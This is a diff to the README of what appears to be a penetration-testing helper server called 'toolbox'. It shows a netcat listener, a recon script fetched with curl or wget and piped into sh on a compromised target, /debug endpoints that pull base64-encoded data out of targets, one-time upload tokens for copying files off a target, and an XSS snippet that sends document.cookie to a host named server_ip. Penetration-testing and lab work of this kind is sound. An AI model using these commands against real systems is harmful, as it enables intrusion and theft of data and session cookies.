@@ -2,8 +2,6 @@
 
 ## Installing
 
-Note: When running `git clone`, you will need to configure Git to authenticate with SSH, or you can create a [disposable personal access token](https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/creating-a-personal-access-token#creating-a-token) with access to private repositories enabled and use that in conjunction with your username to authenticate.
-
 ```
 git clone https://github.com/AlanFoster/toolbox.git
 ```
@@ -78,48 +76,53 @@ On the host machine you create a listener as normal:
 rlwrap nc -lnvp 4444
 ```
 
+#### Uploading files
+
+If you wish to upload files to your host machine from a target you can generate temporary one time upload tokens. Note that this functionality requires that the server be started with a secure `--password` flag, otherwise it is disabled from the interface:
+
+```
+python3 toolbox.py serve -p 8000 --password 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 .
+```
+
+When the browser prompts for authentication only the password is required:
+
+![Upload file name](./images/upload_file.png)
+![Upload file token authentication](./images/upload_file_token_authentication.png)
+![Upload file token](./images/upload_file_token.png)
+
+After running the generated command on the target machine the file will be accessible on the host machine. Note that this token will be invalidated after use, and cannot be reused:
+
+![Upload file command on target](./images/upload_file_target.png)
+
 #### Remote target recon
 
-In some scenarios may we have gained initial remote code execution, and we want to upgrade this to a fully working shell.
+The `recon.sh` script is great for use in the scenario of having initial remote code execution and you want to upgrade to a working shell. This script will log information about the remote target which you can then use to select the best reverse shell payload.
 
-The `recon.sh` script is great in this scenario as it will log information about the remote target which you can use to select teh best reverse shell payload.
-
-On the host machine execute the `recon.sh` script with either `curl` or `wget`:
+First run the `recon.sh` script on the target machine with either `curl` or `wget`:
 
 ```
 curl http://localhost:8000/shells/recon.sh | sh
 wget http://localhost:8000/shells/recon.sh -O- | sh
 ```
 
-The server console will now log information about the remote target. In the below scenario we can see that the target is running as root, and has busybox `nc` and `python3` available - which is enough information to get a shell:
+The server console will now log information about the remote target. In the below scenario we can see that the target is running as `root`, and has both `nc` and `python3` available - which is enough information to get a decide on a reverse shell payload:
 
 ![Example of the extracting data from the target](./images/recon.png)
 
 Note that this remote logging functionality is implemented by making HTTP requests to the server with a base path of `/debug`. The `value` query string parameter will additionally be base64 decoded and highlighted in green. This means you can easily extract arbitrary information from the host machine, examples:
 
-```
+```bash
 wget "http://localhost:8000/debug/"
 wget "http://localhost:8000/debug/hello_world"
 wget "http://localhost:8000/debug/tools/python/?value=$(python --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
 ```
 
-The debugging endpoint can be great for validating XSS payloads too. For instance within JavaScript:
+The `/debug` endpoint can be great for validating XSS payloads too. For instance within JavaScript you could use the following to track important parts of your XSS payload:
 
 ```javascript
-fetch("http://server_ip:8000/debug/xss_code_executed");
+fetch("http://server_ip:8000/debug/xss_code_started");
 fetch(`http://server_ip:8000/debug/extracted_cookies?value=${encodeURI(btoa(document.cookie))}`);
 ```
-
-#### Uploading files
-
-If you wish to upload files to your host machine from a target you can generate temporary one time upload tokens:
-
-![Upload file name](./images/upload_file.png)
-![Upload file token](./images/upload_file_token.png)
-
-After running the generated command on the target machine the file will be accessible on the host machine. Note that this token will be invalidated after use, and cannot be reused:
-
-![Upload file command on target](./images/upload_file_target.png)
 
 ## Contributing
 
@@ -150,9 +153,15 @@ You must first install the developer dependencies:
 pipenv install --dev
 ```
 
+Enter a Python environment:
+
+```shell
+pipenv shell
+```
+
 Running all tests:
 
-```
+```shell
 pytest
 ```
 
@@ -170,16 +179,11 @@ Run with:
 pytest -m focus
 ```
 
-Add a debugging breakpoint with:
+To enter an interactive debugging environment place either of the two lines into your code:
 
 ```python
 breakpoint()
-```
-
-Updating snapshots:
-
-```shell
-pytest --snapshot-update
+import pdb; pdb.set_trace()
 ```
 
 Updating third party dependencies:
@@ -190,7 +194,11 @@ git submodule update --remote
 
 ## Planned
 
-- Configure setup.py to install only the required source code + datafiles + licenses
+- Configure setup.py to install only the required source code + data files + licenses
+- Automated github actions to ensure the latest third party libraries are downloaded
+- Potentially add exploits with configurable payloads
+- Shell listener support, instead of `rlwrap nc`
+- Generate one time upload tokens from the command line directly, with/without the server running
 - Add additional files:
   - Static pspy64
   - Static Docker client
